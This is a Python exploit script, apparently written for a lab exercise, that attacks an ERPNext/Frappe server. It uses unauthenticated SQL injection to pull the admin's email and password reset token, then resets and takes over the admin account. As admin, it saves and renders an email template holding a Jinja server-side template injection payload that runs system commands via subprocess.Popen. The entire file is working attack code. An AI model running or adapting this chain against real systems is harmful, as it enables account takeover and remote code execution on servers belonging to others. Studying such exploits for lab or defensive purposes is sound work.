#!/usr/bin/env python3 

import requests
import argparse
import traceback
from http.cookies import SimpleCookie

"""
Example usage:
/usr/bin/python3 cmd_exc.py 192.168.232.123
"""

def ResetAdminPassword(target):
    """
    Retrieving the admin's email adress, so we can make the password reset against it 
    """
    url = f"http://{target}:8000/"
    cookies = {"system_user": "yes", "user_id": "Guest", "sid": "Guest", "user_image": "", "full_name": "Guest"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "None", "X-Requested-With": "XMLHttpRequest"}
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "offsec", "scope": "offsec_scope\" union all select 1,2,3,4,name collate utf8mb4_general_ci from __Auth#"}
    try:
        print("[*] Retrieving the admin's email...")
        admEmail = requests.post(url, headers=headers, cookies=cookies, data=data)
        json_admEmail = admEmail.json()
        for item in json_admEmail["message"]:
            route = item.get("route", "")
            if "@" in route and "." in route:
                email = route
                print("[+] Admin's Email: ", email)
                """
                Making the password reset request against the retrieved admin's account
                """
                data = {"cmd": "frappe.core.doctype.user.user.reset_password", "user": "zeljka.k@randomdomain.com"}
                try:
                    print(f"[*] Sending the password reset request against {email}")
                    passRst = requests.post(url, headers=headers, cookies=cookies, data=data)
                    if "Password reset instructions have been sent to your email" in passRst.text:
                        print("[+] Password Reset request has been made succefully")
                        """
                            Retrieve the password reset token
                        """
                        data = {"cmd": "frappe.utils.global_search.web_search", "text": "offsec", "scope": "\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"}
                        try:
                            print("[*] Hijacking the admin's password reset token")
                            passRstTknRes = requests.post(url, headers=headers, cookies=cookies, data=data)
                            json_passRstTkn = passRstTknRes.json()
                            for item in json_passRstTkn["message"]:
                                doctype = item.get("doctype", "")
                                route = item.get("route")
                                if "@" in doctype and "." in doctype and route:
                                    passResetToken = route
                                    print("[+] Password Reset Token Retrieved: ", passResetToken)
                                    print(f"[+] Password Reset link of the admin's account http://{target}:8000/update-password?key={passResetToken}")
                                    """
                                    Updating the admin's password to NewPassword!1234
                                    """
                                    newPassword = "NewPassword!1234"
                                    data = {"key": f"{passResetToken}", "old_password": '', "new_password": f"{newPassword}", "logout_all_sessions": "1", "cmd": "frappe.core.doctype.user.user.update_password"}
                                    try:
                                        print("[*] Updating the admin's password...")
                                        UpdtAdmPassRes = requests.post(url, headers=headers, cookies=cookies, data=data)
                                        if "Zeljka Kola" in UpdtAdmPassRes.text and UpdtAdmPassRes.status_code == 200:
                                            print("[+] Admin's password has been updated successfully")
                                            print(f"[+] New credentials: {email}:{newPassword}")
                                        else:
                                            print("[-] Failed to update the admin's password")
                                    except Exception as e:
                                        print("[-] Error updating the admin's password: ", e)
                        except Exception as e:
                            print("[-] Error retrieving the password reset token: ", e)
                    else:
                        print("[-] Failed to make the password reset request")
                except Exception as e:
                    print("[-] Error requesting password reset for the admin's account: ", e)
    except Exception as e:
        print("[-] Error retrieving admin's email: ", e)
        traceback.print_exc()

def CommandExec(target):
    url = f"http://{target}:8000/"
    cookies = {"user_id": "Guest", "full_name": "Guest", "sid": "Guest", "user_image": "", "system_user": "yes"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    loginData = {"cmd": "login", "usr": "zeljka.k@randomdomain.com", "pwd": "NewPassword!1234", "device": "desktop"}
    try:
        print("[*] Logging you into the admin's account...")
        loginResponse = requests.post(url, headers=headers, cookies=cookies, data=loginData)
        if "Logged In" in loginResponse.text:
            print("[+] Login successfull")
            raw_cookie_header = loginResponse.headers.get("Set-Cookie", "")
            cookie = SimpleCookie()
            cookie.load(raw_cookie_header)
            sid_value = cookie.get("sid").value
            user_id_value = cookie.get("user_id").value
            full_name_value = cookie.get("full_name").value
            """
            Creating the malicious template
            """
            crtTmpUrl = f"http://{target}:8000/api/method/frappe.desk.form.save.savedocs"
            admCookies = {"sid": f"{sid_value}", "user_id": f"{user_id_value}", "full_name": f"{full_name_value}"}
            crtTmpData = {"doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 2\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"SSTI RCE2\",\"subject\":\"SSTI RCE2\",\"response\":\"<div>{% set string = \\\"ssti\\\" %}</div><div>{% set class = \\\"__class__\\\" %}</div><div>{% set mro = \\\"__mro__\\\" %}</div><div>{% set subclasses = \\\"__subclasses__\\\" %}</div><div><br></div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r[258]([\\\"/usr/bin/touch\\\",\\\"/tmp/das-ist-walter\\\"]) }}</div>\"}", "action": "Save"}
            try:
                print("[*] Creating malicious template...")
                requests.post(crtTmpUrl, headers=headers, cookies=admCookies, data=crtTmpData)
                print("[+] Created successfully")
                """
                Rendring the malicious template to execute system commands (touching das-ist-walter file on the /tmp directory of the target system)
                """
                rndrTmpUrl = f"http://{target}:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
                rndrTmpData = {"template_name": "SSTI RCE2", "doc": "{\"response\":\"<div>{% set string = \\\"ssti\\\" %}</div><div>{% set class = \\\"__class__\\\" %}</div><div>{% set mro = \\\"__mro__\\\" %}</div><div>{% set subclasses = \\\"__subclasses__\\\" %}</div><div><br></div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r[258]([\\\"/usr/bin/touch\\\",\\\"/tmp/das-ist-walter\\\"]) }}</div>\",\"modified\":\"2025-07-23 15:15:43.418818\",\"subject\":\"SSTI RCE\",\"modified_by\":\"zeljka.k@randomdomain.com\",\"creation\":\"2025-07-23 15:15:43.418818\",\"idx\":0,\"parent\":null,\"doctype\":\"Email Template\",\"parentfield\":null,\"docstatus\":0,\"parenttype\":null,\"owner\":\"zeljka.k@randomdomain.com\",\"name\":\"SSTI RCE\",\"__last_sync_on\":\"2025-07-23T19:15:42.826Z\"}", "_lang": ''}
                try:
                    print("[*] Rendring the malicious template...")
                    rndrRes = requests.post(rndrTmpUrl, headers=headers, cookies=admCookies, data=rndrTmpData)
                    if "subprocess.Popen object at" in rndrRes.text:
                        print("[+] Code Execution was successfull")
                        print("[+] Check your /tmp directory for `das-ist-walter` file")
                    else:
                        print("[-] Failed to execute code")
                except Exception as e:
                    print("[-] Error rendring the malicious template: ", e)
            except Exception as e:
                print("[-] Error creating the malicious template: ", e)
        else:
            print("[-] Failed to login to the admin's account")
    except Exception as e:
        print("[-] Error logging-in to the admin's account: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="ERPNext Authenticated SSTI to RCE")
    parser.add_argument("target", help="terget's machine IP (e.g, 192.168.232.123)")
    args = parser.parse_args()
    ResetAdminPassword(args.target)
    CommandExec(args.target)

if __name__ == "__main__":
    main()
